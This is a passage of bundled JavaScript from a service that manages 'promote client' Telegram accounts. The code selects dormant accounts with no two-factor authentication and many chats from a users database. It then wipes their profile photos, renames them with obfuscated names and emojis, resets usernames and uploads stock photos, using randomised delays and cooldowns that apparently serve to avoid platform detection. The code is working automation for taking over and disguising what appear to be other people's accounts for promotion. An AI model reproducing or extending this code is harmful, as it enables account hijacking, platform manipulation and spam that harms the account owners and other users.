                await this.markAsInactive(doc.mobile, errorDetails.message);
            }
            return 0;
        }
        finally {
            await this.safeUnregisterClient(doc.mobile);
        }
    }
    async deleteProfilePhotos(doc, client, failedAttempts) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(doc.mobile, { autoDisconnect: true, handler: false });
        try {
            await (0, Helpers_1.sleep)(5000 + Math.random() * 5000);
            const photos = await telegramClient.client.invoke(new telegram_1.Api.photos.GetUserPhotos({ userId: 'me', offset: 0 }));
            if (photos.photos.length > 0) {
                await telegramClient.deleteProfilePhotos();
                this.logger.debug(`Deleted ${photos.photos.length} profile photos for ${doc.mobile}`);
            }
            else {
                this.logger.debug(`No profile photos to delete for ${doc.mobile}`);
            }
            await this.update(doc.mobile, {
                profilePicsDeletedAt: new Date(),
                lastUpdateAttempt: new Date(),
                failedUpdateAttempts: 0,
                lastUpdateFailure: null
            });
            await (0, Helpers_1.sleep)(30000 + Math.random() * 20000);
            return photos.photos.length > 0 ? 1 : 0;
        }
        catch (error) {
            const errorDetails = this.handleError(error, 'Error deleting photos', doc.mobile);
            await this.update(doc.mobile, {
                lastUpdateAttempt: new Date(),
                failedUpdateAttempts: failedAttempts + 1,
                lastUpdateFailure: new Date()
            });
            if ((0, isPermanentError_1.default)(errorDetails)) {
                await this.markAsInactive(doc.mobile, errorDetails.message);
            }
            return 0;
        }
        finally {
            await this.safeUnregisterClient(doc.mobile);
        }
    }
    async updateNameAndBio(doc, client, failedAttempts) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(doc.mobile, { autoDisconnect: true, handler: false });
        try {
            await (0, Helpers_1.sleep)(5000 + Math.random() * 5000);
            const me = await telegramClient.getMe();
            await (0, Helpers_1.sleep)(5000 + Math.random() * 5000);
            let updateCount = 0;
            const expectedName = client?.name.split(' ')[0];
            if (!(0, checkMe_utils_1.isIncludedWithTolerance)((0, checkMe_utils_1.safeAttemptReverse)(me?.firstName), expectedName, 2)) {
                this.logger.log(`Updating first name for ${doc.mobile} from ${me.firstName} to ${client.name}`);
                await telegramClient.updateProfile(`${(0, utils_1.obfuscateText)(`${expectedName} ${(0, utils_1.getRandomPetName)()}`, {
                    maintainFormatting: false,
                    preserveCase: true,
                    useInvisibleChars: false
                })} ${(0, utils_1.getCuteEmoji)()}`, '');
                updateCount = 1;
            }
            await this.update(doc.mobile, {
                nameBioUpdatedAt: new Date(),
                lastUpdateAttempt: new Date(),
                failedUpdateAttempts: 0,
                lastUpdateFailure: null
            });
            this.logger.debug(`Updated name and bio for ${doc.mobile}`);
            await (0, Helpers_1.sleep)(30000 + Math.random() * 20000);
            return updateCount;
        }
        catch (error) {
            const errorDetails = this.handleError(error, 'Error updating profile', doc.mobile);
            await this.update(doc.mobile, {
                lastUpdateAttempt: new Date(),
                failedUpdateAttempts: failedAttempts + 1,
                lastUpdateFailure: new Date()
            });
            if ((0, isPermanentError_1.default)(errorDetails)) {
                await this.markAsInactive(doc.mobile, errorDetails.message);
            }
            return 0;
        }
        finally {
            await this.safeUnregisterClient(doc.mobile);
        }
    }
    async updateUsername(doc, client, failedAttempts) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(doc.mobile, { autoDisconnect: true, handler: false });
        try {
            await (0, Helpers_1.sleep)(5000 + Math.random() * 5000);
            await this.telegramService.updateUsername(doc.mobile, '');
            await this.update(doc.mobile, {
                usernameUpdatedAt: new Date(),
                lastUpdateAttempt: new Date(),
                failedUpdateAttempts: 0,
                lastUpdateFailure: null
            });
            this.logger.debug(`Updated username for ${doc.mobile}`);
            await (0, Helpers_1.sleep)(30000 + Math.random() * 20000);
            return 1;
        }
        catch (error) {
            const errorDetails = this.handleError(error, 'Error updating username', doc.mobile);
            await this.update(doc.mobile, {
                lastUpdateAttempt: new Date(),
                failedUpdateAttempts: failedAttempts + 1,
                lastUpdateFailure: new Date()
            });
            if ((0, isPermanentError_1.default)(errorDetails)) {
                await this.markAsInactive(doc.mobile, errorDetails.message);
            }
            return 0;
        }
        finally {
            await this.safeUnregisterClient(doc.mobile);
        }
    }
    async updateProfilePhotos(doc, client, failedAttempts) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(doc.mobile, { autoDisconnect: true, handler: false });
        try {
            await (0, Helpers_1.sleep)(5000 + Math.random() * 5000);
            const photos = await telegramClient.client.invoke(new telegram_1.Api.photos.GetUserPhotos({ userId: 'me', offset: 0 }));
            let updateCount = 0;
            if (photos.photos.length < 2) {
                await cloudinary_1.CloudinaryService.getInstance(client?.dbcoll?.toLowerCase());
                await (0, Helpers_1.sleep)(10000 + Math.random() * 5000);
                const shuffle = (arr) => {
                    const a = arr.slice();
                    for (let i = a.length - 1; i > 0; i--) {
                        const j = Math.floor(Math.random() * (i + 1));
                        [a[i], a[j]] = [a[j], a[i]];
                    }
                    return a;
                };
                const photoPaths = shuffle(['dp1.jpg', 'dp2.jpg', 'dp3.jpg']);
                const randomPhoto = photoPaths[0];
                await telegramClient.updateProfilePic(path_1.default.join(process.cwd(), randomPhoto));
                updateCount = 1;
                this.logger.debug(`Updated profile photo ${randomPhoto} for ${doc.mobile} (1 of ${photoPaths.length} photos)`);
            }
            await this.update(doc.mobile, {
                profilePicsUpdatedAt: new Date(),
                lastUpdateAttempt: new Date(),
                failedUpdateAttempts: 0,
                lastUpdateFailure: null
            });
            await (0, Helpers_1.sleep)(40000 + Math.random() * 20000);
            return updateCount;
        }
        catch (error) {
            const errorDetails = this.handleError(error, 'Error updating profile photos', doc.mobile);
            await this.update(doc.mobile, {
                lastUpdateAttempt: new Date(),
                failedUpdateAttempts: failedAttempts + 1,
                lastUpdateFailure: new Date()
            });
            if ((0, isPermanentError_1.default)(errorDetails)) {
                await this.markAsInactive(doc.mobile, errorDetails.message);
            }
            return 0;
        }
        finally {
            await this.safeUnregisterClient(doc.mobile);
        }
    }
    async processPromoteClient(doc, client) {
        if (!client) {
            this.logger.warn(`Client not found for promote client ${doc.mobile}`);
            return 0;
        }
        const MIN_COOLDOWN_HOURS = 2;
        const MAX_FAILED_ATTEMPTS = 3;
        const FAILURE_RESET_DAYS = 7;
        const now = Date.now();
        let updateCount = 0;
        try {
            await (0, Helpers_1.sleep)(15000 + Math.random() * 10000);
            const failedAttempts = doc.failedUpdateAttempts || 0;
            const lastFailureTime = client_helper_utils_1.ClientHelperUtils.getTimestamp(doc.lastUpdateFailure);
            if (failedAttempts > 0 && lastFailureTime > 0 && now - lastFailureTime > FAILURE_RESET_DAYS * this.ONE_DAY_MS) {
                this.logger.log(`Resetting failure count for ${doc.mobile} (last failure was ${Math.floor((now - lastFailureTime) / this.ONE_DAY_MS)} days ago)`);
                await this.update(doc.mobile, {
                    failedUpdateAttempts: 0,
                    lastUpdateFailure: null
                });
            }
            else if (failedAttempts >= MAX_FAILED_ATTEMPTS) {
                this.logger.warn(`Skipping ${doc.mobile} - too many failed attempts (${failedAttempts}). Will retry after ${FAILURE_RESET_DAYS} days.`);
                return 0;
            }
            const lastUpdateAttempt = client_helper_utils_1.ClientHelperUtils.getTimestamp(doc.lastUpdateAttempt);
            if (lastUpdateAttempt > 0 && now - lastUpdateAttempt < MIN_COOLDOWN_HOURS * 60 * 60 * 1000) {
                const hoursRemaining = ((MIN_COOLDOWN_HOURS * 60 * 60 * 1000) - (now - lastUpdateAttempt)) / (60 * 60 * 1000);
                this.logger.debug(`Client ${doc.mobile} on cooldown, ${hoursRemaining.toFixed(1)} hours remaining`);
                return 0;
            }
            const lastUsed = client_helper_utils_1.ClientHelperUtils.getTimestamp(doc.lastUsed);
            const hasAnyUpdate = !!(doc.privacyUpdatedAt || doc.profilePicsDeletedAt || doc.nameBioUpdatedAt ||
                doc.usernameUpdatedAt || doc.profilePicsUpdatedAt);
            if (hasAnyUpdate && lastUsed > 0 && now - lastUsed < MIN_COOLDOWN_HOURS * 60 * 60 * 1000) {
                this.logger.debug(`Client ${doc.mobile} recently used, skipping`);
                return 0;
            }
            const accountAge = doc.createdAt ? now - new Date(doc.createdAt).getTime() : 0;
            if (accountAge > 30 * this.ONE_DAY_MS) {
                this.logger.debug(`Client ${doc.mobile} is older than 30 days, skipping`);
                return 0;
            }
            if (lastUsed > 0) {
                await this.backfillTimestamps(doc.mobile, doc, now);
                this.logger.debug(`Client ${doc.mobile} has been used, assuming configured`);
                return 0;
            }
            const pendingUpdates = this.getPendingUpdates(doc, now);
            if (pendingUpdates.totalPending > 0) {
                this.logger.debug(`Client ${doc.mobile} has ${pendingUpdates.totalPending} pending updates: ${pendingUpdates.reasons.join(', ')}`);
            }
            else {
                this.logger.debug(`Client ${doc.mobile} has no pending updates - all complete!`);
            }
            if (pendingUpdates.needsPrivacy) {
                updateCount = await this.updatePrivacySettings(doc, client, failedAttempts);
                return updateCount;
            }
            if (pendingUpdates.needsDeletePhotos) {
                updateCount = await this.deleteProfilePhotos(doc, client, failedAttempts);
                return updateCount;
            }
            if (pendingUpdates.needsNameBio) {
                updateCount = await this.updateNameAndBio(doc, client, failedAttempts);
                return updateCount;
            }
            if (pendingUpdates.needsUsername) {
                updateCount = await this.updateUsername(doc, client, failedAttempts);
                return updateCount;
            }
            if (pendingUpdates.needsProfilePhotos) {
                updateCount = await this.updateProfilePhotos(doc, client, failedAttempts);
                return updateCount;
            }
            if (updateCount === 0) {
                await this.update(doc.mobile, { lastUpdateAttempt: new Date() });
                if (pendingUpdates.totalPending > 0) {
                    this.logger.debug(`No updates performed for ${doc.mobile} despite ${pendingUpdates.totalPending} pending updates. Reasons: ${pendingUpdates.reasons.join(', ')}`);
                }
            }
            else {
                const remainingPending = pendingUpdates.totalPending - updateCount;
                if (remainingPending > 0) {
                    this.logger.debug(`Client ${doc.mobile} still has ${remainingPending} pending updates remaining`);
                }
                else {
                    this.logger.log(` Client ${doc.mobile} - ALL UPDATES COMPLETE! Ready for use.`);
                }
            }
            return updateCount;
        }
        catch (error) {
            const errorDetails = this.handleError(error, 'Error with client', doc.mobile);
            try {
                await this.update(doc.mobile, { lastUpdateAttempt: new Date() });
            }
            catch (updateError) {
                this.logger.warn(`Failed to track update attempt for ${doc.mobile}:`, updateError);
            }
            if ((0, isPermanentError_1.default)(errorDetails)) {
                await this.markAsInactive(doc.mobile, `${errorDetails.message}`);
            }
            return 0;
        }
        finally {
            await (0, Helpers_1.sleep)(15000 + Math.random() * 10000);
        }
    }
    async checkPromoteClients() {
        if (this.telegramService.getActiveClientSetup()) {
            this.logger.warn('Ignored active check promote channels as active client setup exists');
            return;
        }
        this.logger.log('Starting promote client check process');
        const clients = await this.clientService.findAll();
        const bufferClients = await this.bufferClientService.findAll();
        const clientMainMobiles = clients.map((c) => c.mobile);
        const bufferClientIds = bufferClients.map((c) => c.mobile);
        const assignedPromoteMobiles = await this.promoteClientModel
            .find({ clientId: { $exists: true }, status: 'active' })
            .distinct('mobile');
        const goodIds = [...clientMainMobiles, ...bufferClientIds, ...assignedPromoteMobiles].filter(Boolean);
        const promoteClientCounts = await this.promoteClientModel.aggregate([
            {
                $match: {
                    clientId: { $exists: true, $ne: null },
                    status: 'active',
                },
            },
            {
                $group: {
                    _id: '$clientId',
                    count: { $sum: 1 },
                    mobiles: { $push: '$mobile' },
                },
            },
        ]);
        const promoteClientsPerClient = new Map(promoteClientCounts.map((result) => [result._id, result.count]));
        let totalUpdates = 0;
        const MIN_COOLDOWN_HOURS = 4;
        const now = Date.now();
        for (const result of promoteClientCounts) {
            if (totalUpdates < 5) {
                for (const promoteClientMobile of result.mobiles) {
                    const promoteClient = await this.findOne(promoteClientMobile, false);
                    if (!promoteClient) {
                        this.logger.warn(`Promote client ${promoteClientMobile} not found, skipping`);
                        continue;
                    }
                    let lastUpdateAttempt = 0;
                    try {
                        lastUpdateAttempt = promoteClient.lastUpdateAttempt
                            ? new Date(promoteClient.lastUpdateAttempt).getTime()
                            : 0;
                    }
                    catch (error) {
                        lastUpdateAttempt = 0;
                    }
                    if (lastUpdateAttempt > 0 && now - lastUpdateAttempt < MIN_COOLDOWN_HOURS * 60 * 60 * 1000) {
                        const hoursRemaining = ((MIN_COOLDOWN_HOURS * 60 * 60 * 1000) - (now - lastUpdateAttempt)) / (60 * 60 * 1000);
                        this.logger.debug(`Skipping ${promoteClientMobile} - on cooldown, ${hoursRemaining.toFixed(1)} hours remaining`);
                        continue;
                    }
                    const lastChecked = promoteClient.lastChecked
                        ? new Date(promoteClient.lastChecked).getTime()
                        : 0;
                    const healthCheckPassed = await this.performHealthCheck(promoteClientMobile, lastChecked, now);
                    if (!healthCheckPassed) {
                        continue;
                    }
                    const hasBeenUsed = promoteClient.lastUsed && new Date(promoteClient.lastUsed).getTime() > 0;
                    if (hasBeenUsed) {
                        const needsBackfill = !promoteClient.privacyUpdatedAt || !promoteClient.profilePicsDeletedAt ||
                            !promoteClient.nameBioUpdatedAt || !promoteClient.usernameUpdatedAt ||
                            !promoteClient.profilePicsUpdatedAt;
                        if (needsBackfill) {
                            await this.backfillTimestamps(promoteClientMobile, promoteClient, now);
                        }
                        this.logger.debug(`Skipping ${promoteClientMobile} - already used, timestamps backfilled`);
                        continue;
                    }
                    const pendingUpdates = this.getPendingUpdates(promoteClient, now);
                    if (pendingUpdates.totalPending > 0) {
                        const client = clients.find((c) => c.clientId === result._id);
                        if (!client) {
                            this.logger.warn(`Client with ID ${result._id} not found, skipping promote client ${promoteClientMobile}`);
                            continue;
                        }
                        const currentUpdates = await this.processPromoteClient(promoteClient, client);
                        this.logger.debug(`Processed promote client ${promoteClientMobile}, updates made: ${currentUpdates} | total updates so far: ${totalUpdates}`);
                        if (currentUpdates > 0) {
                            totalUpdates += currentUpdates;
                        }
                        this.logger.log(`Processed promote client ${promoteClientMobile}, updates made: ${currentUpdates} | total updates so far: ${totalUpdates}`);
                        if (totalUpdates >= 5) {
                            this.logger.warn('Reached total update limit of 5 for this check cycle');
                            break;
                        }
                    }
                }
            }
            else {
                this.logger.warn(`Skipping promote client ${result.mobiles.join(', ')} as total updates reached 5`);
            }
        }
        const clientNeedingPromoteClients = [];
        for (const client of clients) {
            const availabilityNeeds = await this.calculateAvailabilityBasedNeeds(client.clientId);
            if (availabilityNeeds.totalNeeded > 0) {
                clientNeedingPromoteClients.push({
                    clientId: client.clientId,
                    ...availabilityNeeds
                });
            }
        }
        clientNeedingPromoteClients.sort((a, b) => a.priority - b.priority);
        let totalSlotsNeeded = 0;
        const clientNeedsMap = new Map();
        for (const clientNeed of clientNeedingPromoteClients) {
            const allocated = Math.min(clientNeed.totalNeeded, this.MAX_NEW_PROMOTE_CLIENTS_PER_TRIGGER - totalSlotsNeeded);
            if (allocated > 0) {
                clientNeedsMap.set(clientNeed.clientId, allocated);
                totalSlotsNeeded += allocated;
            }
            if (totalSlotsNeeded >= this.MAX_NEW_PROMOTE_CLIENTS_PER_TRIGGER)
                break;
        }
        this.logger.debug(`Availability-based needs calculated (NO HARD LIMIT):`);
        clientNeedingPromoteClients.forEach(need => {
            this.logger.debug(`Client ${need.clientId} (priority: ${need.priority}): ` +
                `${need.totalActive} total active, ${need.totalNeeded} new needed - ${need.calculationReason}`);
            need.windowNeeds.forEach(window => {
                if (window.needed > 0) {
                    this.logger.debug(`  - ${window.window} (${window.targetDate}): ` +
                        `${window.available} available, ${window.needed} needed ` +
                        `(target: ${window.minRequired} per window)`);
                }
                else {
                    this.logger.debug(`  - ${window.window} (${window.targetDate}): ` +
                        `${window.available} available  (sufficient, target: ${window.minRequired})`);
                }
            });
        });
        const totalActivePromoteClients = await this.promoteClientModel.countDocuments({ status: 'active' });
        this.logger.debug(`Total active promote clients: ${totalActivePromoteClients}`);
        this.logger.debug(`Total slots needed: ${totalSlotsNeeded} (limited to max ${this.MAX_NEW_PROMOTE_CLIENTS_PER_TRIGGER} per trigger)`);
        const clientNeedsSummary = clientNeedingPromoteClients
            .map(c => `${c.clientId}: ${c.totalNeeded} (${c.calculationReason})`)
            .join('\n');
        await (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.notifbot)()}&text=${encodeURIComponent(`Promote Client Check (Dynamic Availability):\n\nTotal Active Promote Clients: ${totalActivePromoteClients}\nPromote Clients Per Client: ${JSON.stringify(Object.fromEntries(promoteClientsPerClient))}\n\nClients Needing Promote Clients:\n${clientNeedsSummary || 'None'}\n\nTotal Slots Needed: ${totalSlotsNeeded}`)}`);
        if (clientNeedingPromoteClients.length > 0 && totalSlotsNeeded > 0) {
            await this.addNewUserstoPromoteClientsDynamic([], goodIds, clientNeedingPromoteClients, promoteClientsPerClient);
        }
        else {
            this.logger.debug('No new promote clients needed - all availability windows and total count satisfied');
        }
    }
    async addNewUserstoPromoteClients(badIds, goodIds, clientsNeedingPromoteClients = [], promoteClientsPerClient) {
        const clientNeedingPromoteClientsDynamic = [];
        for (const clientId of clientsNeedingPromoteClients) {
            const availabilityNeeds = await this.calculateAvailabilityBasedNeeds(clientId);
            if (availabilityNeeds.totalNeeded > 0) {
                clientNeedingPromoteClientsDynamic.push({
                    clientId,
                    ...availabilityNeeds
                });
            }
        }
        clientNeedingPromoteClientsDynamic.sort((a, b) => a.priority - b.priority);
        await this.addNewUserstoPromoteClientsDynamic(badIds, goodIds, clientNeedingPromoteClientsDynamic, promoteClientsPerClient);
    }
    async addNewUserstoPromoteClientsDynamic(badIds, goodIds, clientsNeedingPromoteClients, promoteClientsPerClient) {
        const threeMonthsAgo = client_helper_utils_1.ClientHelperUtils.getDateStringDaysAgo(this.INACTIVE_USER_CUTOFF_DAYS, this.ONE_DAY_MS);
        let totalNeeded = 0;
        for (const clientNeed of clientsNeedingPromoteClients) {
            totalNeeded += clientNeed.totalNeeded;
        }
        totalNeeded = Math.min(totalNeeded, this.MAX_NEW_PROMOTE_CLIENTS_PER_TRIGGER);
        if (totalNeeded === 0) {
            this.logger.debug('No promote clients needed - all availability windows and total count satisfied');
            return;
        }
        this.logger.debug(`Creating ${totalNeeded} new promote clients (all with availableDate = today) ` +
            `to satisfy availability windows and total count requirements`);
        const documents = await this.usersService.executeQuery({
            mobile: { $nin: goodIds },
            expired: false,
            twoFA: false,
            lastActive: { $lt: threeMonthsAgo },
            totalChats: { $gt: 150 },
        }, { tgId: 1 }, totalNeeded + 5);
        const today = client_helper_utils_1.ClientHelperUtils.getTodayDateString();
        const assignmentQueue = [];
        for (const clientNeed of clientsNeedingPromoteClients) {
            for (let i = 0; i < clientNeed.totalNeeded; i++) {
                assignmentQueue.push({
                    clientId: clientNeed.clientId,
                    priority: clientNeed.priority
                });
            }
        }
        let processedCount = 0;
        let assignmentIndex = 0;
        while (processedCount < totalNeeded &&
            documents.length > 0 &&
            assignmentIndex < assignmentQueue.length) {
            const document = documents.shift();
            if (!document || !document.mobile || !document.tgId) {
                this.logger.warn('Invalid document found, skipping');
                continue;
            }
            const assignment = assignmentQueue[assignmentIndex];
            if (!assignment) {
                this.logger.debug('No more assignments needed');
                break;
            }
            try {
                const created = await this.createPromoteClientFromUser(document, assignment.clientId, today);
                if (created) {
                    assignmentIndex++;
                    processedCount++;
                    this.logger.debug(`Created promote client ${document.mobile} for ${assignment.clientId} ` +
                        `with availableDate = ${today} (available immediately, priority: ${assignment.priority})`);
                }
                else {
                    processedCount++;
                }
            }
            catch (error) {
                const errorDetails = this.handleError(error, 'Error creating client connection', document.mobile);
                this.logger.error(`Error creating connection for ${document.mobile}:`, errorDetails);
                await (0, Helpers_1.sleep)(10000 + Math.random() * 5000);
                processedCount++;
            }
        }
        this.logger.log(` Dynamic batch completed: Created ${processedCount} new promote clients ` +
            `(all with availableDate = ${today}, available immediately). ` +
            `System maintains availability windows and total count requirements.`);
    }
    clearAllTimeouts() {
        this.activeTimeouts.forEach((timeout) => clearTimeout(timeout));
        this.activeTimeouts.clear();
        this.logger.debug('Cleared all active timeouts');
    }
    async cleanup() {
        try {
            this.clearAllTimeouts();
            this.clearMemoryCleanup();
            this.clearJoinChannelInterval();
            this.clearLeaveChannelInterval();
            this.clearPromoteMap();
            this.clearLeaveMap();
            this.isJoinChannelProcessing = false;
            this.isLeaveChannelProcessing = false;
        }
        catch (error) {
            this.logger.error('Error during cleanup:', error);
        }
    }
    async onModuleDestroy() {
        await this.cleanup();
    }
    async getPromoteClientDistribution() {
        const clients = await this.clientService.findAll();
        const now = new Date();
        const last24Hours = new Date(now.getTime() - this.ONE_DAY_MS);
        const [totalPromoteClients, unassignedPromoteClients, activePromoteClients, inactivePromoteClients, assignedCounts, activeCounts, inactiveCounts, neverUsedCounts, recentlyUsedCounts,] = await Promise.all([
            this.promoteClientModel.countDocuments({}),
            this.promoteClientModel.countDocuments({ clientId: { $exists: false } }),
            this.promoteClientModel.countDocuments({ status: 'active' }),
            this.promoteClientModel.countDocuments({ status: 'inactive' }),
            this.promoteClientModel.aggregate([
                { $match: { clientId: { $exists: true, $ne: null } } },
                { $group: { _id: '$clientId', count: { $sum: 1 } } },
            ]),
            this.promoteClientModel.aggregate([
                { $match: { clientId: { $exists: true, $ne: null }, status: 'active' } },
                { $group: { _id: '$clientId', count: { $sum: 1 } } },
            ]),
            this.promoteClientModel.aggregate([
                { $match: { clientId: { $exists: true, $ne: null }, status: 'inactive' } },
                { $group: { _id: '$clientId', count: { $sum: 1 } } },
            ]),
            this.promoteClientModel.aggregate([
                {
                    $match: {
                        clientId: { $exists: true, $ne: null },
                        status: 'active',
                        $or: [{ lastUsed: { $exists: false } }, { lastUsed: null }],
                    },
                },
                { $group: { _id: '$clientId', count: { $sum: 1 } } },
            ]),
            this.promoteClientModel.aggregate([
                {
                    $match: {
                        clientId: { $exists: true, $ne: null },
                        status: 'active',
                        lastUsed: { $gte: last24Hours },
                    },
                },
                { $group: { _id: '$clientId', count: { $sum: 1 } } },
            ]),
        ]);
        const assignedCountMap = new Map(assignedCounts.map((item) => [item._id, item.count]));
        const activeCountMap = new Map(activeCounts.map((item) => [item._id, item.count]));
        const inactiveCountMap = new Map(inactiveCounts.map((item) => [item._id, item.count]));
        const neverUsedCountMap = new Map(neverUsedCounts.map((item) => [item._id, item.count]));
        const recentlyUsedCountMap = new Map(recentlyUsedCounts.map((item) => [item._id, item.count]));
        const distributionPerClient = [];
        let clientsWithSufficient = 0;
        let clientsNeedingMore = 0;
        let totalNeeded = 0;
        for (const client of clients) {
            const assignedCount = assignedCountMap.get(client.clientId) || 0;
            const activeCount = activeCountMap.get(client.clientId) || 0;
            const inactiveCount = inactiveCountMap.get(client.clientId) || 0;
            const neverUsed = neverUsedCountMap.get(client.clientId) || 0;
            const usedInLast24Hours = recentlyUsedCountMap.get(client.clientId) || 0;
            const needed = Math.max(0, this.MAX_NEEDED_PROMOTE_CLIENTS_PER_CLIENT - activeCount);
            const status = needed === 0 ? 'sufficient' : 'needs_more';
            distributionPerClient.push({
                clientId: client.clientId,
                assignedCount,
                activeCount,
                inactiveCount,
                needed,
                status,
                neverUsed,
                usedInLast24Hours,
            });
            if (status === 'sufficient') {
                clientsWithSufficient++;
            }
            else {
                clientsNeedingMore++;
                totalNeeded += needed;
            }
        }
        const maxPerTrigger = this.MAX_NEW_PROMOTE_CLIENTS_PER_TRIGGER;
        const triggersNeeded = Math.ceil(totalNeeded / maxPerTrigger);
        return {
            totalPromoteClients,
            unassignedPromoteClients,
            activePromoteClients,
            inactivePromoteClients,
            distributionPerClient,
            summary: {
                clientsWithSufficientPromoteClients: clientsWithSufficient,
                clientsNeedingPromoteClients: clientsNeedingMore,
                totalPromoteClientsNeeded: totalNeeded,
                maxPromoteClientsPerTrigger: maxPerTrigger,
                triggersNeededToSatisfyAll: triggersNeeded,
            },
        };
    }
    async getPromoteClientsByStatus(status) {
        return this.promoteClientModel.find({ status }).exec();
    }
    async getPromoteClientsWithMessages() {
        return this.promoteClientModel
            .find({}, { mobile: 1, status: 1, message: 1, clientId: 1, lastUsed: 1 })
            .exec();
    }
    async getLeastRecentlyUsedPromoteClients(clientId, limit = 1) {
        return this.promoteClientModel
            .find({ clientId, status: 'active' })
            .sort({ lastUsed: 1, _id: 1 })
            .limit(limit)
            .exec();
    }
    async getNextAvailablePromoteClient(clientId) {
        const clients = await this.getLeastRecentlyUsedPromoteClients(clientId, 1);
        return clients.length > 0 ? clients[0] : null;
    }
    async getUnusedPromoteClients(hoursAgo = 24, clientId) {
        const cutoffDate = new Date(Date.now() - hoursAgo * 60 * 60 * 1000);
        const filter = {
            status: 'active',
            $or: [
                { lastUsed: { $lt: cutoffDate } },
                { lastUsed: { $exists: false } },
                { lastUsed: null },
            ],
        };
        if (clientId) {
            filter.clientId = clientId;
        }
        return this.promoteClientModel.find(filter).exec();
    }
    async getUsageStatistics(clientId) {
        const filter = { status: 'active' };
        if (clientId) {
            filter.clientId = clientId;
        }
        const now = new Date();
        const last24Hours = new Date(now.getTime() - this.ONE_DAY_MS);
        const lastWeek = new Date(now.getTime() - 7 * this.ONE_DAY_MS);
        const [totalClients, neverUsed, usedInLast24Hours, usedInLastWeek, allClients,] = await Promise.all([
            this.promoteClientModel.countDocuments(filter),
            this.promoteClientModel.countDocuments({
                ...filter,
                $or: [{ lastUsed: { $exists: false } }, { lastUsed: null }],
            }),
            this.promoteClientModel.countDocuments({
                ...filter,
                lastUsed: { $gte: last24Hours },
            }),
            this.promoteClientModel.countDocuments({
                ...filter,
                lastUsed: { $gte: lastWeek },
            }),
            this.promoteClientModel.find(filter, { lastUsed: 1, createdAt: 1 }).exec(),
        ]);
        let totalGap = 0;
        let gapCount = 0;
        for (const client of allClients) {
            if (client.lastUsed) {
                const gap = now.getTime() - new Date(client.lastUsed).getTime();
                totalGap += gap;
                gapCount++;
            }
        }
        const averageUsageGap = gapCount > 0 ? totalGap / gapCount / (60 * 60 * 1000) : 0;
        return {
            totalClients,
            neverUsed,
            usedInLast24Hours,
            usedInLastWeek,
            averageUsageGap,
        };
    }
    createTimeout(callback, delay) {
        const timeout = setTimeout(() => {
            this.activeTimeouts.delete(timeout);
            callback();
        }, delay);
        this.activeTimeouts.add(timeout);
        return timeout;
    }
};
exports.PromoteClientService = PromoteClientService;
exports.PromoteClientService = PromoteClientService = PromoteClientService_1 = __decorate([
    (0, common_1.Injectable)(),
    __param(0, (0, mongoose_1.InjectModel)(promote_client_schema_1.PromoteClient.name)),
    __param(1, (0, common_1.Inject)((0, common_1.forwardRef)(() => Telegram_service_1.TelegramService))),
    __param(2, (0, common_1.Inject)((0, common_1.forwardRef)(() => users_service_1.UsersService))),
    __param(3, (0, common_1.Inject)((0, common_1.forwardRef)(() => active_channels_service_1.ActiveChannelsService))),
    __param(4, (0, common_1.Inject)((0, common_1.forwardRef)(() => client_service_1.ClientService))),
    __param(5, (0, common_1.Inject)((0, common_1.forwardRef)(() => channels_service_1.ChannelsService))),
    __param(6, (0, common_1.Inject)((0, common_1.forwardRef)(() => buffer_client_service_1.BufferClientService))),
    __param(7, (0, common_1.Inject)((0, common_1.forwardRef)(() => session_manager_1.SessionService))),
    __metadata("design:paramtypes", [mongoose_2.Model,
        Telegram_service_1.TelegramService,
        users_service_1.UsersService,
        active_channels_service_1.ActiveChannelsService,
        client_service_1.ClientService,
        channels_service_1.ChannelsService,
        buffer_client_service_1.BufferClientService,
        session_manager_1.SessionService,
        bots_1.BotsService])
], PromoteClientService);


/***/ }),

/***/ "./src/components/promote-clients/schemas/index.ts":
/*!*********************************************************!*\
  !*** ./src/components/promote-clients/schemas/index.ts ***!
  \*********************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
      desc = { enumerable: true, get: function() { return m[k]; } };
    }
    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __exportStar = (this && this.__exportStar) || function(m, exports) {
    for (var p in m) if (p !== "default" && !Object.prototype.hasOwnProperty.call(exports, p)) __createBinding(exports, m, p);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
__exportStar(__webpack_require__(/*! ./promote-client.schema */ "./src/components/promote-clients/schemas/promote-client.schema.ts"), exports);


/***/ }),

/***/ "./src/components/promote-clients/schemas/promote-client.schema.ts":
/*!*************************************************************************!*\
  !*** ./src/components/promote-clients/schemas/promote-client.schema.ts ***!
  \*************************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.PromoteClientSchema = exports.PromoteClient = void 0;
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
let PromoteClient = class PromoteClient {
};
exports.PromoteClient = PromoteClient;
__decorate([
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], PromoteClient.prototype, "tgId", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: true, unique: true }),
    __metadata("design:type", String)
], PromoteClient.prototype, "mobile", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], PromoteClient.prototype, "lastActive", void 0);
__decorate([
